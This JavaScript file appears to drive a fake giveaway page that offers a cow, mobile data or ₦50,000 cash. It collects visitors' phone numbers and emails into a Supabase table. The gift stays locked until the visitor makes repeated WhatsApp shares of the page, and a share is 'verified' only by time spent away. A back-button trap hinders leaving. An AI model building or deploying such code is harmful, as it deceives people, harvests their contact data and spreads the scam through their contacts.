(()=>{'use strict';

const C=window.SITE_CONFIG;
const F=window.FAN_CONVERSATION||{};
const $=id=>document.getElementById(id);
const esc=s=>String(s||'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[c]));

const GIFTS={
  cow:{title:'Cow Gift',icon:'🐄',claim:'VIEW COW GIFT LOCATION'},
  data:{title:'Data Up to 100GB',icon:'📶',claim:'CONTINUE WITH 100GB DATA'},
  cash:{title:'Cash Gift Up to ₦50,000',icon:'💵',claim:'CONTINUE WITH ₦50,000 CASH GIFT'},
  available:{title:'Any Available Gift',icon:'🎁',claim:'VIEW OTHER AVAILABLE GIFTS'}
};

let state={
  name:'',
  phone:'',
  email:'',
  gift:'',
  stage:'landing',
  shareProgress:0,
  shareComplete:false,
  liked:false,
  localLikes:0,
  localShares:0,
  userComments:[],
  commentLikes:{},
  commentAuthor:''
};

let shareOpenedAt=0;
let shareWasOpened=false;
let lastShareTap=0;
let allowExit=false;

function load(){
  try{
    const saved=JSON.parse(localStorage.getItem('pj_fan_gift_modular')||'null');
    if(saved)state={...state,...saved};
  }catch(e){}
  if(!Array.isArray(state.userComments))state.userComments=[];
  if(!state.commentLikes||typeof state.commentLikes!=='object')state.commentLikes={};
}

function save(){
  try{localStorage.setItem('pj_fan_gift_modular',JSON.stringify(state))}catch(e){}
}

function firstName(){
  return state.name.trim().split(/\s+/)[0]||'Friend';
}

function show(id){
  document.querySelectorAll('.screen').forEach(s=>s.classList.toggle('active',s.id===id));
  state.stage=id;
  save();
  $('stickyShare').style.display=id==='share'?'block':'none';
  scrollTo({top:0,behavior:'smooth'});
  if(id==='share')renderShare();
  if(id==='final')renderFinal();
  renderFeeds();
}

function supabaseHeaders(prefer='return=minimal'){
  return {
    'apikey':C.supabase.anonKey,
    'Authorization':`Bearer ${C.supabase.anonKey}`,
    'Content-Type':'application/json',
    'Prefer':prefer
  };
}

async function supabaseRequest(path,options={}){
  if(!C.supabase?.url||!C.supabase?.anonKey||!C.supabase?.table){
    throw new Error('Supabase is not configured.');
  }
  const controller=new AbortController();
  const timeout=setTimeout(()=>controller.abort(),12000);
  try{
    const response=await fetch(`${C.supabase.url}/rest/v1/${path}`,{...options,signal:controller.signal});
    if(!response.ok){
      let details='';
      try{details=await response.text()}catch(e){}
      throw new Error(`Supabase request failed (${response.status}) ${details}`);
    }
    return response;
  }finally{
    clearTimeout(timeout);
  }
}

async function saveRegistration(){
  const record={
    full_name:'Guest',
    phone:state.phone,
    email:state.email,
    gift:state.gift,
    share_progress:state.shareProgress,
    share_complete:state.shareComplete,
    source_page:location.href.split('#')[0],
    updated_at:new Date().toISOString()
  };
  const table=encodeURIComponent(C.supabase.table);
  await supabaseRequest(table,{
    method:'POST',
    headers:supabaseHeaders(),
    body:JSON.stringify(record)
  });
}

async function saveRegistrationWithRetry(){
  const waits=[0,900,2200];
  for(let i=0;i<waits.length;i++){
    if(waits[i])await new Promise(resolve=>setTimeout(resolve,waits[i]));
    try{
      await saveRegistration();
      return true;
    }catch(error){
      if(i===waits.length-1)console.warn('Background registration save failed:',error);
    }
  }
  return false;
}

async function syncProgress(){
  if(!state.email)return;
  const table=encodeURIComponent(C.supabase.table);
  const email=encodeURIComponent(state.email);
  try{
    await supabaseRequest(`${table}?email=eq.${email}`,{
      method:'PATCH',
      headers:supabaseHeaders(),
      body:JSON.stringify({
        share_progress:state.shareProgress,
        share_complete:state.shareComplete,
        updated_at:new Date().toISOString()
      })
    });
  }catch(error){
    console.warn('Progress sync failed:',error);
  }
}

function validateRegistration(){
  const phone=$('phone').value.replace(/\D/g,'').slice(0,11);
  const email=$('email').value.trim().toLowerCase();
  const gift=$('giftSelect').value;
  const okPhone=/^\d{10,11}$/.test(phone);
  const okEmail=/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/i.test(email);

  $('phone').value=phone;
  $('phoneError').classList.toggle('show',!okPhone);
  $('emailError').classList.toggle('show',!okEmail);
  $('giftError').classList.toggle('show',!gift);
  $('submitError').classList.remove('show');

  return {ok:okPhone&&okEmail&&!!gift,phone,email,gift};
}

function submitForm(){
  const result=validateRegistration();
  if(!result.ok)return;

  Object.assign(state,{
    name:'',
    phone:result.phone,
    email:result.email,
    gift:result.gift
  });
  save();

  show('share');
  setTimeout(()=>{saveRegistrationWithRetry();},0);
}

function openHeroGiftChooser(){
  const chooser=$('heroGiftChooser');
  if(!chooser)return;
  chooser.hidden=false;
  chooser.classList.add('open');
  $('heroCta').setAttribute('aria-expanded','true');
  const first=chooser.querySelector('[data-hero-gift]');
  if(first)first.focus({preventScroll:true});
}

function chooseHeroGift(gift){
  if(!GIFTS[gift])return;
  state.gift=gift;
  $('giftSelect').value=gift;
  save();

  document.querySelectorAll('[data-hero-gift]').forEach(btn=>{
    btn.classList.toggle('selected',btn.dataset.heroGift===gift);
  });

  const form=$('formCard');
  form.classList.add('form-active');
  form.scrollIntoView({behavior:'smooth',block:'start'});
  setTimeout(()=>$('email').focus({preventScroll:true}),450);
}

function renderShare(){
  const g=GIFTS[state.gift]||GIFTS.available;
  $('shareTitle').textContent=`Complete Sharing for Your ${g.title}`;
  $('shareCopy').textContent=`${firstName()}, your gift page is still locked. Complete every required WhatsApp share action below.`;
  $('giftPill').textContent=`${g.icon} ${g.title}`;
  updateShare(false);
}

function updateShare(sync=true){
  const pct=Math.min(100,Math.round(state.shareProgress/C.requiredShares*100));
  state.shareComplete=state.shareProgress>=C.requiredShares;
  $('sharePercent').textContent=pct+'%';
  $('shareFill').style.width=pct+'%';
  $('shareCount').textContent=`${state.shareProgress} of ${C.requiredShares} share actions completed`;
  $('claimBtn').disabled=!state.shareComplete;
  $('claimBtn').textContent=state.shareComplete?'CONTINUE TO MY GIFT':'LOCKED — COMPLETE SHARING';
  $('feedback').textContent=state.shareComplete
    ?'Verification complete. Your gift page is now unlocked.'
    :pct>0
      ?'Progress saved. Continue sharing and return here each time.'
      :'No share action has been verified yet.';
  save();
  if(sync)syncProgress();
}

function openWhatsApp(){
  const now=Date.now();
  if(now-lastShareTap<C.shareCooldownMs)return;
  lastShareTap=now;
  shareWasOpened=true;
  shareOpenedAt=now;
  location.href=`https://wa.me/?text=${encodeURIComponent(C.shareMessage+'\n'+location.href.split('#')[0])}`;
}

function handleReturn(){
  if(!shareWasOpened)return;
  const away=Date.now()-shareOpenedAt;
  shareWasOpened=false;
  if(away<C.minimumWhatsAppAwayMs){
    openMessage('⚠️','Share Not Counted','Complete the WhatsApp share, then return.',false);
    return;
  }
  if(state.shareProgress<C.requiredShares){
    state.shareProgress++;
    updateShare();
    openMessage(
      state.shareComplete?'✓':'↗',
      state.shareComplete?'Sharing Completed':'Progress Updated',
      state.shareComplete
        ?'Your sharing stage is complete. Continue to your gift page.'
        :`${state.shareProgress} of ${C.requiredShares} share actions completed.`,
      !state.shareComplete
    );
  }
}

function openMessage(icon,title,text,again){
  $('messageIcon').textContent=icon;
  $('messageTitle').textContent=title;
  $('messageText').textContent=text;
  $('messageAgain').style.display=again?'block':'none';
  $('messageContinue').textContent=state.shareComplete?'CONTINUE TO MY GIFT':'CONTINUE';
  $('messageModal').classList.add('show');
}

function renderFinal(){
  const selected=state.gift;
  $('finalCopy').textContent=`${firstName()}, your sharing stage is complete. Continue with your selected gift below.`;
  $('claimList').innerHTML=[selected,...Object.keys(GIFTS).filter(k=>k!==selected)].map(id=>{
    const g=GIFTS[id];
    return `<div class="claim-card ${id===selected?'selected':''}"><div class="claim-top"><div class="gift-icon">${g.icon}</div><div><h3>${esc(g.title)}</h3>${id===selected?'<small>YOUR SELECTED GIFT</small>':''}</div></div><p>Use the button below to continue with this gift option.</p><button class="gift-action" data-gift="${id}">${esc(g.claim)}</button><div id="note-${id}" class="small-note">This link will be added during setup.</div></div>`;
  }).join('');

  document.querySelectorAll('[data-gift]').forEach(b=>{
    b.onclick=()=>{
      const url=C.giftLinks[b.dataset.gift];
      if(url){
        location.href=url;
      }else{
        const note=$(`note-${b.dataset.gift}`);
        note.classList.add('show');
        setTimeout(()=>note.classList.remove('show'),2500);
      }
    };
  });
}

function age(ts){
  const seconds=Math.max(0,Math.floor((Date.now()-ts)/1000));
  if(seconds<60)return'now';
  const minutes=Math.floor(seconds/60);
  if(minutes<60)return minutes+'m';
  const hours=Math.floor(minutes/60);
  if(hours<24)return hours+'h';
  return Math.floor(hours/24)+'d';
}

function comments(){
  return [...state.userComments].sort((a,b)=>b.ts-a.ts);
}

function initials(name){
  const value=(name||'Guest').trim();
  return value.split(/\s+/).map(part=>part[0]).join('').slice(0,2).toUpperCase()||'G';
}

function commentHtml(c){
  const liked=!!state.commentLikes[c.id];
  return `<div class="comment ${c.replyTo?'reply-row':''}">
    <div class="avatar">${esc(initials(c.n))}</div>
    <div class="comment-body">
      <div class="bubble">
        ${c.replyTo?`<small>Replying to ${esc(c.replyTo)}</small>`:''}
        <b>${esc(c.n||'Guest')}</b>
        <p>${esc(c.t)}</p>
      </div>
      <div class="meta">
        <button data-like-comment="${c.id}" class="${liked?'liked':''}">${liked?'Liked':'Like'}</button>
        <button data-reply="${esc(c.n||'Guest')}">Reply</button>
        <span>${age(c.ts)}</span>
      </div>
    </div>
  </div>`;
}

function feedHtml(){
  const list=comments();
  const rendered=list.length
    ?list.map(commentHtml).join('')
    :'<div class="comments-empty">No comments yet. Add yours below.</div>';

  return `<div class="feed">
    <div class="feed-head">
      <h3>Fan Conversation</h3>
      <p>Join the conversation below.</p>
    </div>
    <div class="social">
      <span>${list.length} ${list.length===1?'comment':'comments'}</span>
    </div>
    <div class="social-actions">
      <button class="like-main ${state.liked?'active':''}">👍 Like</button>
      <button class="focus-comment">💬 Comment</button>
      <button class="share-page">↗ Share</button>
    </div>
    <div class="comments">${rendered}</div>
    <div class="replying-to" hidden></div>
    <div class="composer">
      <input class="comment-name-input" maxlength="40" placeholder="Your name (optional)" value="${esc(state.commentAuthor||'')}">
      <div class="composer-row">
        <input class="comment-input" maxlength="220" placeholder="Write a comment…">
        <button class="comment-send" aria-label="Post comment">➤</button>
      </div>
    </div>
  </div>`;
}

function renderFeeds(){
  if($('landingFeed'))$('landingFeed').innerHTML=feedHtml();
  if($('finalFeed')&&state.stage==='final')$('finalFeed').innerHTML=feedHtml();
  bindFeed();
}

function bindFeed(){
  document.querySelectorAll('.feed').forEach(feed=>{
    const likeMain=feed.querySelector('.like-main');
    const focusComment=feed.querySelector('.focus-comment');
    const shareButton=feed.querySelector('.share-page');
    const sendButton=feed.querySelector('.comment-send');
    const commentInput=feed.querySelector('.comment-input');
    const nameInput=feed.querySelector('.comment-name-input');

    if(likeMain)likeMain.onclick=()=>{
      state.liked=!state.liked;
      state.localLikes+=state.liked?1:-1;
      save();
      renderFeeds();
    };

    if(focusComment)focusComment.onclick=()=>commentInput?.focus();
    if(shareButton)shareButton.onclick=sharePage;

    const send=()=>addComment(feed);
    if(sendButton)sendButton.onclick=send;
    if(commentInput)commentInput.onkeydown=e=>{
      if(e.key==='Enter'){
        e.preventDefault();
        send();
      }
    };

    if(nameInput)nameInput.onchange=()=>{
      state.commentAuthor=nameInput.value.trim().slice(0,40);
      save();
    };

    feed.querySelectorAll('[data-like-comment]').forEach(button=>{
      button.onclick=()=>{
        state.commentLikes[button.dataset.likeComment]=!state.commentLikes[button.dataset.likeComment];
        save();
        renderFeeds();
      };
    });

    feed.querySelectorAll('[data-reply]').forEach(button=>{
      button.onclick=()=>{
        feed.dataset.replyTo=button.dataset.reply;
        const banner=feed.querySelector('.replying-to');
        if(banner){
          banner.hidden=false;
          banner.innerHTML=`Replying to <strong>${esc(button.dataset.reply)}</strong> <button type="button" class="cancel-reply">×</button>`;
          banner.querySelector('.cancel-reply').onclick=()=>{
            delete feed.dataset.replyTo;
            banner.hidden=true;
            banner.textContent='';
          };
        }
        commentInput?.focus();
      };
    });
  });
}

function addComment(feed){
  const input=feed.querySelector('.comment-input');
  const nameInput=feed.querySelector('.comment-name-input');
  const text=input?.value.trim();
  if(!text)return;

  const author=(nameInput?.value||state.commentAuthor||'Guest').trim().slice(0,40)||'Guest';
  const replyTo=feed.dataset.replyTo||'';

  state.commentAuthor=author==='Guest'?'':author;
  state.userComments.unshift({
    id:'u'+Date.now()+Math.random().toString(36).slice(2,6),
    n:author,
    t:text.slice(0,220),
    replyTo,
    ts:Date.now()
  });

  const max=Number(F.maxStoredComments)||60;
  state.userComments=state.userComments.slice(0,max);
  save();
  renderFeeds();
}

async function sharePage(){
  state.localShares++;
  save();
  try{
    if(navigator.share){
      await navigator.share({
        title:'Peller & Jarvis Fans Gift Celebration',
        text:'Peller & Jarvis Fans Gift Celebration',
        url:location.href.split('#')[0]
      });
    }else{
      openWhatsApp();
    }
  }catch(e){}
  renderFeeds();
}

function showExit(){
  if(allowExit)return;
  $('exitModal').classList.add('show');
}

function setupExitTrap(){
  history.pushState({stay:true},'',location.href);
  window.addEventListener('popstate',()=>{
    if(allowExit)return;
    history.pushState({stay:true},'',location.href);
    showExit();
  });
}

function leavePage(){
  allowExit=true;
  const url=(C.facebookExitUrl||'').trim();
  if(url){
    location.href=url;
  }else{
    history.go(-2);
  }
}

document.addEventListener('click',e=>{
  const go=e.target.closest('[data-go]');
  if(go)show(go.dataset.go);
});

$('demoBanner').textContent=C.demoBanner;
$('demoBanner').style.display=C.demoBanner?'block':'none';

$('heroCta').onclick=openHeroGiftChooser;
document.querySelectorAll('[data-hero-gift]').forEach(button=>{
  button.onclick=()=>chooseHeroGift(button.dataset.heroGift);
});

$('submitForm').onclick=submitForm;
$('giftSelect').onchange=()=>{
  const gift=$('giftSelect').value;
  if(gift&&GIFTS[gift]){
    state.gift=gift;
    save();
  }
};

$('phone').addEventListener('input',()=>{
  $('phone').value=$('phone').value.replace(/\D/g,'').slice(0,11);
});

$('shareBtnTop').onclick=openWhatsApp;
$('stickyShareBtn').onclick=openWhatsApp;
$('claimBtn').onclick=()=>state.shareComplete&&show('final');
$('messageContinue').onclick=()=>{
  $('messageModal').classList.remove('show');
  if(state.shareComplete)show('final');
};
$('messageAgain').onclick=()=>{
  $('messageModal').classList.remove('show');
  openWhatsApp();
};
$('exitStay').onclick=()=>$('exitModal').classList.remove('show');
$('exitLeave').onclick=leavePage;

document.addEventListener('visibilitychange',()=>{if(!document.hidden)handleReturn()});
window.addEventListener('focus',handleReturn);

load();

$('phone').value=state.phone||'';
$('email').value=state.email||'';
$('giftSelect').value=state.gift||'';

if(state.gift){
  document.querySelectorAll('[data-hero-gift]').forEach(btn=>{
    btn.classList.toggle('selected',btn.dataset.heroGift===state.gift);
  });
}

renderFeeds();
setInterval(()=>renderFeeds(),60000);
setupExitTrap();
show(state.shareComplete?'final':state.stage==='share'?'share':'landing');

window.resetPellerJarvisDemo=()=>{
  localStorage.removeItem('pj_fan_gift_modular');
  location.reload();
};

})();